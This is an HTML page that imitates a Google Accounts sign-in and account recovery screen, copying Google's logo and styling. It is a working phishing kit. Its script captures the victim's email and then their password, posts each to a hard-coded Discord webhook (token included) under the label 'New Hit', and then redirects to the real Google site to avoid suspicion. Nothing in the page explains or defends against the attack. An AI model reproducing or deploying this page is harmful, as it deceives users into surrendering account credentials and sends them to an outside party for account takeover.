<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1f1f1f;
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            color: #e3e3e3;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background-color: #121212;
            border-radius: 28px;
            padding: 48px 40px;
            width: 100%;
            max-width: 900px;
            box-sizing: border-box;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            gap: 40px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .left-pane {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .logo {
            width: 48px;
            height: 48px;
            margin-bottom: 40px;
        }

        h1 {
            font-size: 36px;
            font-weight: 400;
            margin: 0 0 16px 0;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            margin: 0;
            color: #c4c7c5;
        }

        .right-pane {
            flex: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 200px;
        }

        .input-group {
            position: relative;
            margin-bottom: 24px;
        }

        .input-group input {
            width: 100%;
            padding: 16px 20px;
            background-color: transparent;
            border: 1px solid #8e918f;
            border-radius: 4px;
            color: #e3e3e3;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        .input-group input:focus {
            border: 2px solid #a8c7fa;
            padding: 15px 19px; 
        }

        .input-group label {
            position: absolute;
            top: -8px;
            left: 12px;
            background-color: #121212;
            padding: 0 4px;
            font-size: 12px;
            color: #c4c7c5;
            pointer-events: none;
        }

        .actions {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 20px;
            margin-top: auto;
        }

        .forgot-btn {
            background: none;
            border: none;
            color: #a8c7fa;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            padding: 0;
        }

        .next-btn {
            background-color: #a8c7fa;
            color: #121212;
            border: none;
            border-radius: 20px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .next-btn:hover {
            background-color: #d3e3fd;
        }

        .footer {
            display: flex;
            justify-content: space-between;
            align-items: center;
            width: 100%;
            max-width: 900px;
            padding: 24px 40px;
            box-sizing: border-box;
            font-size: 12px;
            color: #c4c7c5;
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
        }

        .footer-left { display: flex; align-items: center; gap: 24px; }
        .footer-right { display: flex; gap: 24px; }
        .footer a { color: #c4c7c5; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <div class="card">
        <div class="left-pane">
            <svg class="logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
            </svg>
            <h1 id="page-title">Account recovery</h1>
            <p class="subtitle" id="page-subtitle">Recover your Google Account</p>
        </div>
        <div class="right-pane">
            <form id="capture-form" onsubmit="handleSubmit(event)">
                <div class="input-group">
                    <input type="text" id="credential-input" required>
                    <label id="input-label" for="credential-input">Email or phone</label>
                </div>
                <div class="actions" style="margin-top: 40px;">
                    <button type="button" class="forgot-btn" id="forgot-btn">Forgot email?</button>
                    <button type="submit" class="next-btn">Next</button>
                </div>
            </form>
        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            <span>English (United States)</span>
        </div>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1571987991503831181/yN4rsZkiOxrfs1GcpiALN6jbvZ_7-hqN8SkAGM2egyGqSLFS21rhVlbSe7adokLPEl4P";
        const REDIRECT_URL = "https://accounts.google.com/";

        let stage = "email"; 
        let capturedEmail = "";

        async function sendToWebhook(data) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**New Hit**\n**Type:** ${data.type}\n**Value:** ${data.value}`
                    })
                });
                
                if (!response.ok) {
                    console.error("Discord rejected the webhook. Status:", response.status);
                }
            } catch (e) {
                console.error("Network error sending to webhook:", e);
            }
        }

        async function handleSubmit(e) {
            e.preventDefault();
            const input = document.getElementById('credential-input');
            const value = input.value.trim();
            if (!value) return;

            if (stage === "email") {
                capturedEmail = value;
                await sendToWebhook({ type: "Email", value: capturedEmail });
                
                stage = "password";
                document.getElementById('page-title').innerText = "Welcome";
                document.getElementById('page-subtitle').innerText = capturedEmail;
                document.getElementById('input-label').innerText = "Enter your password";
                input.type = "password";
                input.value = "";
                input.focus();
                document.getElementById('forgot-btn').style.display = "none";
            } 
            else if (stage === "password") {
                await sendToWebhook({ type: "Password", value: value });
                window.location.href = REDIRECT_URL;
            }
        }
    </script>
</body>
</html>
